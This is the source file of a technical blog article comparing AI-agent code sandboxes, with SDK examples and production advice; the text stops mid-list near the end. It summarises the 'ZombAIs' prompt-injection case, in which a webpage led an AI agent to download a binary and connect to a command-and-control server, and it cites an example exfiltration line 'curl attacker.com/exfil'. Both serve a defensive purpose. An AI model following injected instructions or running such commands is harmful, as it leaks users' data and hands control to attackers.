import CodeBlock from "@/components/Articles/CodeBlock";
import { Article } from "@/types";

export const meta: Article = {
  id: 15,
  slug: "code-execution-sandboxes-ai-agents-2026",
  title:
    "Code execution sandboxes for AI agents in 2026: E2B, Modal, Vercel Sandbox, Cloudflare, and Daytona compared",
  excerpt:
    "Why every serious AI agent now runs inside a sandbox, how the five frontier platforms differ once you ship them, and the production patterns - isolation model, cold start budget, credential injection, snapshots - that decide whether your agent fleet survives real traffic.",
  metaDescription:
    "A practical, technical guide to AI agent code execution sandboxes in 2026. Covers E2B (Firecracker microVMs, $21M Series A, 88% Fortune 100), Modal (gVisor, 50,000+ concurrent sessions, GPU), Vercel Sandbox (Hive, sub-second starts, snapshots), Cloudflare Sandboxes (persistent containers, PTY, code interpreter), Daytona (sub-90ms cold starts), the isolation model trade-offs (microVM vs gVisor vs container), prompt-injection threat model, credential injection, observability, and working TypeScript examples.",
  image:
    "https://assets.northflank.com/best_code_execution_sandbox_for_ai_agents_4ae1c3572a.png",
  author: {
    name: "Reactify Solutions",
    image: "/icon.png",
    designation: "Engineering Team",
  },
  tags: [
    "AI",
    "Agents",
    "Sandboxes",
    "E2B",
    "Modal",
    "Vercel Sandbox",
    "Cloudflare",
  ],
  publishDate: "2026-06-06",
  readingTime: "16 min read",
};

export default function CodeExecutionSandboxesAiAgents2026Post() {
  return (
    <div className="prose prose-lg prose-invert max-w-none text-white/80">
      <p className="mb-6 text-lg leading-relaxed">
        Eighteen months ago, &ldquo;an AI agent running code on real
        infrastructure&rdquo; meant a Docker container someone wired into a
        Jupyter kernel and a quiet prayer that the model would not{" "}
        <code>rm -rf</code> the wrong directory. In 2026 it is a category. E2B
        closed a $21M Series A in July 2025 and now counts 88% of the Fortune
        100 as users. Vercel Sandbox shipped GA in January 2026 on the same
        Firecracker fleet that runs 2.7 million deployments a day. Cloudflare
        Sandboxes hit GA in April with persistent containers, PTY, code
        interpreters, and secure credential injection. Modal Sandboxes run
        millions of untrusted snippets a day for Lovable and Quora. Daytona
        pivoted the entire company onto sub-90ms cold starts for agent
        workloads. The agent loop is solved well enough. The question every
        production team now answers is which sandbox layer runs underneath it.
        This post is how we choose, what the five frontier platforms actually
        do differently, and the operational patterns that survive a week of
        real traffic.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Why every serious agent now runs in a sandbox
      </h2>
      <p className="mb-6 leading-relaxed">
        Two forces pushed the sandbox from a nice-to-have to a production
        requirement. The first is volume: Cursor alone accepts close to a
        billion lines of LLM-written code a day, and a non-trivial share of
        that code gets executed inside an agent loop somewhere downstream.
        The second is the threat model. In late 2024, security researcher
        Johann Rehberger published the &ldquo;ZombAIs&rdquo; write-up where a
        webpage with a hidden prompt-injection payload convinced Claude
        Computer Use to download a binary, <code>chmod +x</code> it, and
        connect back to a command-and-control server - on the first try, on
        an unprotected host. Greshake et al. had already formalised the
        indirect-prompt-injection class of attack in 2023; ZombAIs made the
        consequence concrete.
      </p>
      <p className="mb-6 leading-relaxed">
        The defence is structural, not prompt-engineered. Smarter system
        prompts do not stop a model from acting on text that arrived through
        a tool result, because the model cannot reliably distinguish
        instructions from data. The only durable answer is to physically
        separate the place the agent thinks from the place the agent acts.
        That separation is what a sandbox is. By Q2 2026 the major hyperscalers
        and frontier AI labs had all shipped a sandbox SKU: Cloudflare,
        Vercel, Modal, Cloudflare Containers, Docker, Together, Beam,
        Northflank, Blaxel, Daytona. E2B remains the dedicated pure-play
        leader. The market consolidated around a small set of architectural
        choices - and those choices are the lens for the rest of this post.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        The four axes a sandbox is bought on
      </h2>
      <p className="mb-4 leading-relaxed">
        Strip away the marketing and every production decision in this space
        collapses onto four trade-offs.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Isolation model.</strong> MicroVM (Firecracker, Kata
          Containers, Cloud Hypervisor) gives every sandbox its own kernel.
          That is the gold standard for untrusted code: a guest-kernel CVE
          cannot reach the host. gVisor sits a layer up, intercepting syscalls
          in user space - strong enough for almost every real workload,
          weaker on paper. Plain Linux containers share a kernel and a Docker
          daemon, and the daemon is the single biggest escape vector - an
          agent that finds the host socket can launch sibling containers with
          host mounts. For anything you cannot fully audit, microVM is the
          baseline.
        </li>
        <li>
          <strong>Cold-start budget.</strong> An agent loop that spawns a
          fresh sandbox per tool call lives or dies by start latency.
          Daytona claims sub-90ms, E2B and Vercel Sandbox both publish
          sub-second on Firecracker, Cloudflare Sandboxes wake on demand from
          a sleep state in roughly the same window. Modal&rsquo;s Memory
          Snapshots (alpha) cut initialisation-heavy workloads further. The
          difference between 150ms and 1.5s matters once you are running
          10,000 sandboxes a day - at that scale, every saved second is a
          chargeable CPU-second avoided.
        </li>
        <li>
          <strong>Session model.</strong> Ephemeral or persistent? E2B caps
          Pro sessions at 24 hours and treats every run as disposable.
          Vercel Sandbox runs for up to 45 minutes by default (extendable to
          5 hours on Enterprise) and bills only on active CPU. Cloudflare
          Sandboxes are persistent by name - you{" "}
          <code>getSandbox(&quot;agent-session-47&quot;)</code> by ID and get
          the same one back, sleeping in between. Northflank has no session
          limit. Long-running coding agents benefit from persistence; pure
          tool-call interpreters benefit from ephemeral.
        </li>
        <li>
          <strong>Deployment surface.</strong> Managed-only (Modal, Vercel,
          Cloudflare), or bring-your-own-cloud (Northflank fully self-serve,
          E2B experimental). If you operate under a VPC mandate, FedRAMP, or
          a healthcare BAA, BYOC is the only acceptable answer; if you do
          not, managed is faster to ship and cheaper per sandbox-hour for
          most workloads.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        The frontier platforms, side by side
      </h2>
      <p className="mb-6 leading-relaxed">
        Six platforms cover roughly 95% of the production deployments we
        encounter on client engagements. The shape of each tells you what
        you are buying.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>E2B.</strong> The dedicated leader. Firecracker microVMs,
          ~150ms cold starts, Python and TypeScript SDKs built specifically
          around an agent loop. Customer list includes Hugging Face,
          Perplexity, Groq, Manus, Lindy, Gumloop. Open-source core, self-host
          option, $0.05/hour for a 1 vCPU sandbox. The 24-hour session cap
          is the only meaningful sharp edge.
        </li>
        <li>
          <strong>Modal.</strong> A full serverless AI platform; Sandboxes
          are one product among inference, training, batch, and notebooks.
          gVisor isolation, 50,000+ concurrent sessions, T4/L4/A10/L40S/A100
          /H100/H200/B200 GPUs without quotas. Production users include
          Lovable, Quora, Ramp, Suno. The right answer when your agent needs
          GPU inside the sandbox.
        </li>
        <li>
          <strong>Vercel Sandbox.</strong> GA on 30 January 2026, built on
          Vercel&rsquo;s internal Firecracker-based platform (codename Hive,
          2.7M deployments/day). Sub-second starts, filesystem snapshots,
          Active CPU pricing. The clean answer for a Next.js team already on
          Vercel and AI SDK. Customers shipping on it include Roo Code and
          Blackbox AI.
        </li>
        <li>
          <strong>Cloudflare Sandboxes.</strong> GA on 13 April 2026, built
          on Cloudflare Containers and Workers. Persistent by default
          (request <code>getSandbox(&quot;session-id&quot;)</code> and the
          same one resumes anywhere on the edge), with PTY support,
          stateful code interpreter contexts, filesystem watching via{" "}
          <code>inotify</code>, snapshots backed by R2, and secure
          credential injection at the egress layer. Figma Make ships on it.
          15,000 concurrent lite instances on the standard plan, Active CPU
          pricing.
        </li>
        <li>
          <strong>Daytona.</strong> Pivoted from dev-environment to AI agent
          sandbox in early 2025. Sub-90ms cold starts, OCI/Docker images,
          stateful workspaces, optional Kata-Containers isolation for
          untrusted code, GPU support (H100, RTX PRO 6000). The fastest
          start times in the category.
        </li>
        <li>
          <strong>Northflank.</strong> Complete cloud platform -
          sandboxes plus managed databases, APIs, GPU workloads, CI/CD - with
          Kata Containers + Cloud Hypervisor microVM isolation, gVisor
          option, true self-serve BYOC across AWS, GCP, Azure, Oracle, bare
          metal. Unlimited sessions, any OCI image. Used at production scale
          by Writer, Sentry, and cto.new for multi-tenant sandboxing.
        </li>
      </ul>
      <p className="mb-6 leading-relaxed">
        Two adjacent categories are worth flagging even though they are not
        the focus here. <strong>Docker Sandboxes</strong> (launched February
        2026) wrap microVMs around the same Docker workflow developers
        already use, and ship Docker CLI, Git, GitHub CLI, Node, Python,
        Go, <code>uv</code>, and <code>jq</code> pre-installed - a good fit
        for local coding-agent runs. <strong>Browser sandboxes</strong>{" "}
        (Browserbase, Firecrawl Browser Sandbox, Steel) are the right
        primitive when the workload is web automation rather than arbitrary
        code execution; we covered them in our 2026 browser-agent post.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        E2B: the SDK-first default
      </h2>
      <p className="mb-6 leading-relaxed">
        E2B&rsquo;s pitch is the cleanest in the category: one SDK call, one
        microVM. Firecracker - the same isolation technology that runs AWS
        Lambda - boots in ~150ms with its own kernel and network namespace.
        The default image ships Python, pip, Node, and bash. You write
        code that runs in the sandbox; the SDK handles the lifecycle. The
        Code Interpreter SDK adds a Jupyter-style stateful execution layer
        on top.
      </p>
      <CodeBlock
        language="bash"
        filename="analyst_agent.py"
        code={`# pip install e2b-code-interpreter>=1.0.0
from e2b_code_interpreter import Sandbox

with Sandbox(timeout=120) as sbx:
    # Install once; state persists for the sandbox lifetime.
    sbx.commands.run("pip install pandas matplotlib")

    execution = sbx.run_code("""
import pandas as pd, matplotlib.pyplot as plt
df = pd.read_csv('https://example.com/q1-revenue.csv')
df['margin'] = (df.revenue - df.cost) / df.revenue
ax = df.groupby('region')['margin'].mean().sort_values().plot.barh()
plt.tight_layout(); plt.savefig('/home/user/margins.png')
print(df.describe())
""")

    print(execution.logs.stdout)
    chart_bytes = sbx.files.read("/home/user/margins.png", "bytes")

# Sandbox is destroyed on context exit. Nothing persists, nothing leaks.`}
      />
      <p className="mb-6 leading-relaxed">
        Three patterns we apply on every E2B deployment. Always set an
        explicit <code>timeout</code> at sandbox-creation time - a stuck
        agent that loops on a syntax error will otherwise burn the full
        24-hour Pro cap. Treat the sandbox as the only place untrusted code
        runs; do not exfiltrate file paths or shell history back into the
        model context without sanitisation. And register a small set of
        custom tools (database read, vector store write, internal HTTP
        call) outside the sandbox rather than letting the model issue raw
        shell commands - the principle of least privilege applies inside
        the sandbox as well as outside it.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Modal: GPU inside the sandbox
      </h2>
      <p className="mb-6 leading-relaxed">
        Modal&rsquo;s differentiator is that the sandbox is part of a full
        AI compute fabric. The same SDK that defines a sandbox defines an
        inference endpoint, a fine-tune job, or a batch run, and the
        sandbox can transparently request a GPU. For an agent that needs
        to run a vision model, score embeddings, or call into a fine-tuned
        local model from inside the sandbox, that collapses a lot of
        plumbing. The trade-off is isolation: Modal uses gVisor rather
        than a microVM, which is excellent for almost every realistic
        workload but a step below Firecracker on paper.
      </p>
      <CodeBlock
        language="bash"
        filename="modal_sandbox.py"
        code={`# pip install modal
import modal

app = modal.App("agent-runtime")

# Define a per-task image at runtime - the agent picks its own deps.
image = (
    modal.Image.debian_slim()
    .pip_install("numpy", "scikit-learn", "matplotlib")
    .apt_install("ffmpeg")
)

@app.local_entrypoint()
def run():
    with modal.Sandbox.create(
        image=image,
        gpu="H100",                # optional: only when the task needs it
        timeout=600,
        cpu=4.0,
        memory=16384,
    ) as sb:
        # Stream output back as the model writes it.
        proc = sb.exec("python", "-c", """
import torch
print('cuda available:', torch.cuda.is_available())
print('device:', torch.cuda.get_device_name(0))
""")
        for line in proc.stdout:
            print(line, end="")`}
      />
      <p className="mb-6 leading-relaxed">
        The pattern that earns its keep on Modal is dynamic image
        definition: an agent that picks its own dependencies at task time
        and defines a per-run image instead of relying on a fat default.
        Ramp&rsquo;s internal background-agent platform, &ldquo;Inspect&rdquo;,
        is a public example - they spin a fresh Modal sandbox per task
        with Vite, Postgres, and Temporal pre-installed, then destroy it.
        No production credential ever touches the sandbox, and the blast
        radius of any one task is zero.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Vercel Sandbox: ephemeral, fast, Vercel-native
      </h2>
      <p className="mb-6 leading-relaxed">
        Vercel Sandbox went GA on 30 January 2026 with one of the clearest
        positioning statements in the category: ephemeral compute for
        agents, built on the same Firecracker fleet that Vercel uses to
        run 2.7 million deployments a day. You get sub-second starts,
        filesystem snapshots that resume in roughly two seconds, Active CPU
        pricing (you do not pay for idle CPU while the agent is waiting on
        a model response), and an open-source SDK and CLI. The default
        session is 45 minutes; Enterprise extends to 5 hours.
      </p>
      <CodeBlock
        language="typescript"
        filename="src/agent/run-task.ts"
        code={`import { Sandbox } from "@vercel/sandbox";

export async function runAgentTask(repoUrl: string, task: string) {
  const sandbox = await Sandbox.create({
    runtime: "node22",
    timeout: 15 * 60_000, // 15 minutes is plenty for most tasks
  });

  try {
    // Clone the user's repo into the isolated microVM filesystem.
    await sandbox.runCommand({
      cmd: "git",
      args: ["clone", "--depth=1", repoUrl, "/workspace"],
    });

    // Install and run the test suite. Stream output back to the caller.
    await sandbox.runCommand({
      cmd: "pnpm",
      args: ["install", "--frozen-lockfile"],
      cwd: "/workspace",
      stdout: process.stdout,
    });

    const result = await sandbox.runCommand({
      cmd: "pnpm",
      args: ["test", "--", "--reporter=json"],
      cwd: "/workspace",
      stdout: process.stdout,
    });

    // Snapshot the post-install state - next run resumes from here.
    const snapshotId = await sandbox.snapshot();
    return { exitCode: result.exitCode, snapshotId };
  } finally {
    await sandbox.stop();
  }
}`}
      />
      <p className="mb-6 leading-relaxed">
        Two adoption patterns we have seen pay off on Vercel Sandbox.
        Blackbox AI standardised on it for &ldquo;Agents HQ&rdquo;, their
        orchestration layer that dispatches tasks to multiple coding agents
        in parallel; the sub-second starts let them fan out to dozens of
        sandboxes per high-level task without resource contention. Roo
        Code uses snapshots to turn agents into persistent collaborators -
        start a task on Monday, snapshot it, resume Thursday when the
        reviewer is back. The pattern they describe internally as
        &ldquo;snapshot, fork, branch&rdquo; is the cleanest pattern we
        have seen for trying two approaches in parallel from a known good
        state.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Cloudflare Sandboxes: persistent, programmable, edge-native
      </h2>
      <p className="mb-6 leading-relaxed">
        Cloudflare took the opposite stance to Vercel. Where Vercel Sandbox
        treats the sandbox as ephemeral and bills only on active CPU,
        Cloudflare Sandboxes are persistent by default. You request a
        sandbox by name; if it is running you get it, if not it starts; when
        it is idle it sleeps automatically. The same ID resolves to the
        same sandbox from anywhere in the world. The platform shipped GA
        on 13 April 2026 with PTY (a real terminal proxied over WebSocket),
        stateful code-interpreter contexts that survive between calls,
        background processes with live preview URLs, filesystem watching
        backed by Linux <code>inotify</code>, and secure credential
        injection at the egress layer - the model never sees the secret.
      </p>
      <CodeBlock
        language="typescript"
        filename="src/worker.ts"
        code={`import { getSandbox } from "@cloudflare/sandbox";
export { Sandbox } from "@cloudflare/sandbox";

// A coding agent that runs a dev server and shows the user a preview.
export default {
  async fetch(request: Request, env: Env) {
    const sessionId = new URL(request.url).searchParams.get("session")!;
    const sandbox = getSandbox(env.Sandbox, sessionId);

    // Idempotent: this is a no-op if the repo is already there.
    await sandbox.gitCheckout("https://github.com/org/demo", {
      targetDir: "/workspace",
      depth: 1,
    });

    // Background dev server. waitForLog returns when the regex matches.
    const server = await sandbox.startProcess("npm run dev", {
      cwd: "/workspace",
    });
    await server.waitForLog(/Local:.*localhost:(\\d+)/);

    // Expose port 3000 as a public, throwaway preview URL.
    const { url } = await sandbox.exposePort(3000);
    return Response.json({ preview: url });
  },
};

// Credentials never reach the sandbox - they are injected at egress.
export class AgentRuntime extends Sandbox {
  static outboundByHost = {
    "api.internal.company.com": (request, env) => {
      const headers = new Headers(request.headers);
      headers.set("authorization", \`Bearer \${env.INTERNAL_TOKEN}\`);
      return fetch(request, { headers });
    },
  };
}`}
      />
      <p className="mb-6 leading-relaxed">
        The pattern that makes Cloudflare Sandboxes interesting beyond the
        feature list is the persistent code interpreter context. Most
        Jupyter-style execution layers reset state between calls, which
        forces the agent to re-import, re-load, and re-fit on every turn -
        an enormous waste of tokens and time. Cloudflare&rsquo;s contexts
        preserve variables and imports across calls the way an actual
        Jupyter kernel does, and the SDK supports stdout streaming via
        <code>onStdout</code> so the model sees output as it lands. For
        any agent doing real exploratory data analysis on top of a
        sandbox, this is the difference between a usable workflow and a
        token-bloat disaster.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Daytona: the cold-start specialist
      </h2>
      <p className="mb-6 leading-relaxed">
        Daytona spent early 2025 repositioning from a generic
        development-environment product to AI-agent sandbox infrastructure,
        and the entire pitch now centres on cold-start latency.
        Sandbox creation lands in the 90ms range - the fastest published
        figure in the category - with OCI/Docker compatibility, stateful
        workspaces that retain shell history and dependencies across
        sessions, and optional Kata Containers for the workloads that need
        microVM-grade isolation. Daytona is the right answer when sub-second
        is not fast enough: real-time agent UIs, per-keystroke linting,
        per-tool-call sandbox-per-call patterns.
      </p>
      <CodeBlock
        language="bash"
        filename="daytona_per_call.py"
        code={`# pip install daytona-sdk
from daytona_sdk import Daytona, CreateSandboxParams

dt = Daytona()  # reads DAYTONA_API_KEY from env

# Spin a per-tool-call sandbox. Sub-100ms creation makes this viable.
def run_python_for_agent(snippet: str) -> str:
    sandbox = dt.create(CreateSandboxParams(language="python"))
    try:
        result = sandbox.process.code_run(snippet)
        return result.result
    finally:
        sandbox.remove()

# Example tool call inside an agent loop.
out = run_python_for_agent("""
import statistics
print(statistics.mean([1, 2, 3, 4, 5]))
""")
print(out)  # -> '3'`}
      />
      <p className="mb-6 leading-relaxed">
        The risk to flag on Daytona is the isolation default. Out of the
        box the sandbox is a standard container; the Kata Containers option
        upgrades to microVM isolation but is not the default. For agents
        running fully untrusted code, opt into Kata explicitly. The default
        is fine for first-party code and adversarially mild workloads.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Cold-start latency, isolation, session cap, GPU
      </h2>
      <p className="mb-4 leading-relaxed">
        Numbers worth grounding the choice in. All sourced from vendor
        documentation as of mid-2026.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Daytona:</strong> ~90ms cold start, Docker default (Kata
          optional), unlimited session, H100/RTX PRO 6000 GPU.
        </li>
        <li>
          <strong>E2B:</strong> ~150ms cold start, Firecracker microVM,
          24-hour Pro session cap, no GPU. $0.05/vCPU-hour.
        </li>
        <li>
          <strong>Vercel Sandbox:</strong> sub-second cold start, Firecracker
          microVM, 45-min default (5h Enterprise), no GPU, Active CPU
          billing (~$0.128/vCPU-hour).
        </li>
        <li>
          <strong>Cloudflare Sandboxes:</strong> sub-second cold start,
          container-based with V8 isolate boundary, persistent by default,
          no GPU at the sandbox layer (use Workers AI separately), Active
          CPU billing.
        </li>
        <li>
          <strong>Modal:</strong> sub-second cold start, gVisor, configurable
          session, full GPU lineup (T4/L4/A10/L40S/A100/H100/H200/B200).
          $0.047/vCPU-hour plus GPU.
        </li>
        <li>
          <strong>Northflank:</strong> seconds (image-pull dependent),
          Kata + Cloud Hypervisor (microVM) or gVisor, unlimited session,
          L4/A100/H100/H200 GPU, BYOC across AWS/GCP/Azure/Oracle/bare metal.
        </li>
      </ul>
      <p className="mb-6 leading-relaxed">
        Treat any single number as directional. A 200-sandbox steady-state
        comparison Northflank published in January 2026 put their managed
        platform at roughly $7,200/month against E2B at $16,800, Modal at
        $24,500, and Vercel Sandbox at $31,000 for the same workload -
        useful as a shape, not as a quote, since pricing schedules and
        billing dimensions (active CPU vs total time, included storage,
        idle behaviour) are constantly moving. Run your own twenty-task
        sample on the two candidates that survive the architectural cut.
      </p>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        The production patterns that keep winning
      </h2>
      <p className="mb-4 leading-relaxed">
        Five patterns show up on every sandbox engagement we have shipped
        in the last year.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Per-task ephemeral sandboxes.</strong> Default to spinning
          a new sandbox per task and destroying it on completion. Persistent
          state is a debugging convenience that becomes a security liability
          the moment a previous task leaks credentials, env vars, or
          poisoned files into the next one. The exception is long-running
          coding-agent sessions where the user explicitly owns the sandbox
          (Roo Code, Replit Agent, Lovable). Even there, snapshot to disk
          and resume - do not keep the VM warm across days.
        </li>
        <li>
          <strong>Credential injection at the egress layer.</strong> The
          single biggest production bug we see is credentials baked into
          the sandbox env or, worse, the model prompt. The right shape is
          an egress proxy that injects the auth header on outbound requests
          to allowlisted hosts and rejects everything else. Cloudflare
          Sandboxes ship this as a first-class primitive
          (<code>outboundByHost</code>); Browserbase&rsquo;s vault is the
          equivalent for browser agents; on E2B and Vercel Sandbox the
          pattern is a sidecar proxy you run yourself.
        </li>
        <li>
          <strong>Snapshot the warm state, not the cold image.</strong>{" "}
          <code>git clone</code> + <code>npm install</code> + dev-server
          boot is a 30-second sequence. Snapshot after the install, fork
          from the snapshot on every subsequent run. Cloudflare reports a
          two-second restore against a thirty-second clean boot on the
          axios test case in their GA post; Vercel quotes similar numbers.
          The economic argument for never snapshotting collapsed in 2025.
        </li>
        <li>
          <strong>Hard timeouts at three levels.</strong> Per tool call
          (30s is a reasonable default), per task loop (10-20 minutes), and
          per sandbox lifetime (1-4 hours). A stuck agent loops forever
          unless you cap it; every provider exposes the timeout knob and
          every team forgets to set it on the third level. E2B&rsquo;s
          <code>timeout</code> argument at <code>Sandbox()</code>{" "}
          construction is the cleanest API in the category.
        </li>
        <li>
          <strong>Step-level observability.</strong> Every shell command,
          every file write, every model call, every tool result is a span.
          Browser-only session replay is necessary but not sufficient -
          without structured traces through LangSmith, Langfuse, Helicone,
          Arize Phoenix, or Future AGI, debugging a silent failure is a
          guessing game. The audit log is also your compliance artefact;
          ship it from day one.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Real workloads where a sandbox earned its line item
      </h2>
      <p className="mb-4 leading-relaxed">
        Four production shapes where the sandbox layer changed the outcome
        on engagements over the last year.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Coding agents and agent-built apps.</strong> The headline
          case. Lovable, v0, Bolt, Replit Agent, and a long tail of
          internal copilots all run user-defined code inside per-session
          sandboxes. Vercel Sandbox and Cloudflare Sandboxes both lead with
          this workload; Roo Code, Blackbox AI Agents HQ, and Figma Make
          are the public reference customers. The sandbox is what makes
          &ldquo;ship the patch and let the user click around the running
          app&rdquo; viable.
        </li>
        <li>
          <strong>Data-analyst agents.</strong> Pandas, DuckDB, matplotlib,
          and the long tail of one-off statistical scripts an analyst would
          write by hand. E2B&rsquo;s Code Interpreter SDK is the dominant
          choice; Cloudflare&rsquo;s persistent code interpreter contexts
          are the strongest second. The sandbox makes &ldquo;here is your
          CSV, here is the dashboard&rdquo; a 30-second loop instead of a
          three-hour ticket.
        </li>
        <li>
          <strong>Background financial and ops agents.</strong> Ramp&rsquo;s
          &ldquo;Inspect&rdquo; agent (Modal-backed) is the canonical
          published example: ephemeral sandboxes with a realistic stack
          (Vite, Postgres, Temporal) that never touch production data
          during a live task. The same shape recurs in insurance back-end
          automation, SaaS billing reconciliation, and internal compliance
          tooling. The sandbox is the gap between &ldquo;the agent has
          write access to the database&rdquo; and a production-safe
          architecture.
        </li>
        <li>
          <strong>Sandbox-as-a-service inside your own product.</strong> If
          you ship a product that runs customer code on customer prompts,
          the sandbox becomes your isolation boundary. cto.new launched to
          30,000+ users on Northflank&rsquo;s microVM sandboxes; Hugging
          Face Spaces runs untrusted user models on similar plumbing.
          BYOC plus microVM is the right stack here - managed-only
          providers will not let you isolate per-customer at the
          infrastructure layer, which is what enterprise procurement asks
          for the moment you sell upmarket.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Where sandboxes still hurt
      </h2>
      <p className="mb-4 leading-relaxed">
        The infrastructure is production-grade. It is not friction-free.
        Six failure modes that show up on most non-trivial deployments.
      </p>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Prompt injection still lives in the agent loop, not the
          sandbox.</strong> The sandbox stops the blast - it does not stop
          the call. An injected tool result that tells the agent to
          exfiltrate the contents of <code>/workspace</code> over an
          allowlisted egress route is still a data leak. The sandbox is
          necessary, not sufficient; a guardrail layer between the model
          and the action is the other half.
        </li>
        <li>
          <strong>Image cold-pulls dominate the first run.</strong> Every
          headline cold-start number assumes a warm image. The first time a
          new image lands on a node, you pay the pull cost - sometimes
          tens of seconds. Pre-warm images for hot agent paths, or
          standardise on a small base image with deps installed at runtime.
        </li>
        <li>
          <strong>Network egress is an attack surface you have to design.</strong>{" "}
          Default-deny on outbound traffic with an explicit allowlist for
          the APIs the agent actually needs. Otherwise an injected
          instruction to <code>curl attacker.com/exfil</code> succeeds at
          the network layer even when it fails at the model layer.
        </li>
        <li>
          <strong>Session-limit math is non-obvious.</strong> E2B caps at
          24 hours; Vercel at 45 minutes by default; Cloudflare and
          Northflank do not cap. Picking a platform whose session model
          mismatches your workload (a long-running build agent on a 45-min
          cap, or a per-call agent on a long-lived sandbox) is the most
          common architecture regret we see.
        </li>
        <li>
          <strong>GPU passthrough is rare.</strong> If your agent needs a
          GPU inside the sandbox - for local inference, embeddings, vision
          - Modal, Northflank, Beam, and Daytona ship it. E2B and Vercel
          Sandbox do not. Plan the platform choice around the GPU
          requirement, not the other way round.
        </li>
        <li>
          <strong>Observability is the part you have to build.</strong>{" "}
          Every provider ships logs. Almost none ship the
          step-by-step, tool-call-by-tool-call structured traces an agent
          team actually needs to debug a silent failure. Wire LangSmith,
          Langfuse, Helicone, Arize, or Future AGI in on day one.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        Comparing the frameworks
      </h2>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>E2B.</strong> The cleanest SDK in the category and the
          default for Python and TypeScript agent teams that want
          Firecracker isolation and don&rsquo;t need a session longer than
          24 hours. Open-source core, self-host option, broad LLM provider
          integrations. The right answer when the workload is
          arbitrary code execution and you want the smallest team-month
          cost.
        </li>
        <li>
          <strong>Modal.</strong> The right answer when the agent needs a
          GPU inside the sandbox, or when the team is already running
          inference and training on Modal and wants sandboxes in the same
          fabric. gVisor isolation is the trade-off; for almost every real
          workload it is fine.
        </li>
        <li>
          <strong>Vercel Sandbox.</strong> The right answer for Next.js
          teams already on Vercel. Ephemeral, Firecracker, snapshot-and-fork,
          Active CPU billing. Strongest for AI-built app workloads where
          the user wants to interact with the running result, not just a
          patch.
        </li>
        <li>
          <strong>Cloudflare Sandboxes.</strong> The right answer for
          edge-resident agents, for any workload that benefits from a
          persistent &ldquo;agent computer&rdquo;, and for teams that want
          credential injection, PTY, code-interpreter contexts, and
          filesystem watching as built-in primitives rather than DIY.
        </li>
        <li>
          <strong>Daytona.</strong> The right answer when cold start is the
          binding constraint - real-time agent UIs, per-keystroke linting,
          per-tool-call sandbox-per-call patterns. Opt into Kata for
          untrusted code.
        </li>
        <li>
          <strong>Northflank.</strong> The right answer in regulated
          industries or for teams with a hard BYOC requirement, and for
          teams that want sandboxes plus the rest of the application stack
          (databases, APIs, GPU, CI/CD) on a single platform.
        </li>
      </ul>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        How to introduce a sandbox on a real project
      </h2>
      <ol className="mb-6 list-decimal space-y-2 pl-6">
        <li>
          Decide ephemeral or persistent before you write code. Per-task
          ephemeral is the default; persistent is the right answer when the
          user owns the sandbox (coding agents, dev-environment workloads).
          Mixing the two on the same fleet produces sandbox lifecycle bugs
          that take weeks to diagnose.
        </li>
        <li>
          Choose isolation by threat model. First-party code on first-party
          infra: containers or gVisor is fine. Anything you cannot fully
          audit: microVM (Firecracker, Kata, Cloud Hypervisor). Do not
          downgrade for cost - the gap between gVisor and microVM at the
          pricing layer is in the tens of percent, not multiples.
        </li>
        <li>
          Pin the session-cap math. E2B caps at 24h, Vercel at 45min
          default, Cloudflare and Northflank do not cap. If your workload
          regularly exceeds the cap, pick a platform whose cap exceeds it.
          Working around a hard session limit at the application layer is a
          year of accidental complexity.
        </li>
        <li>
          Wire credentials through an egress proxy, never through the
          sandbox env or the model prompt. Cloudflare ships this as
          <code>outboundByHost</code>; on the other platforms it is your
          sidecar. The cost of getting this wrong is a credential
          screenshot in a public log file.
        </li>
        <li>
          Default-deny on outbound network access. Add an explicit
          allowlist for the APIs the agent actually needs. The injected
          payload that succeeds at the network layer when the model layer
          fails is the one that ends up in a postmortem.
        </li>
        <li>
          Set timeouts at three levels: per tool call, per task loop, per
          sandbox lifetime. Make them small. The stuck-agent CPU bill is
          the most common cost-overrun story in the category.
        </li>
        <li>
          Snapshot after install, fork from the snapshot. Pay the
          <code>git clone + npm install</code> cost once per warm image,
          not once per run. The two-second restore is what makes the unit
          economics of agent fleets work.
        </li>
        <li>
          Instrument from day one. Every shell command, every file write,
          every model call, every tool result as a span. Session replay
          from your provider is necessary but not sufficient; LangSmith,
          Langfuse, Arize, Helicone, or Future AGI cover the rest.
        </li>
      </ol>

      <h2 className="mb-4 mt-10 text-3xl font-bold text-white">
        The 2026 trajectory
      </h2>
      <ul className="mb-6 list-disc space-y-2 pl-6">
        <li>
          <strong>Sandboxes become table-stakes inside every AI SDK.</strong>{" "}
          OpenAI Agents SDK, Anthropic Claude Agent SDK, and Google ADK all
          now ship reference sandbox integrations in their first-party
          docs. The default no longer ships without one. Expect every
          serious agent framework - LangGraph, CrewAI, AG2, Agno - to wire
          a default sandbox by year end.
        </li>
        <li>
          <strong>Active CPU pricing wins.</strong> The economics of
          billing an idle sandbox while the model thinks have collapsed.
          Vercel, Cloudflare, and Modal have all moved to active-CPU
          billing; expect E2B and Daytona to follow. The model where you
          paid for the wall-clock of a sleeping VM is a 2024 artefact.
        </li>
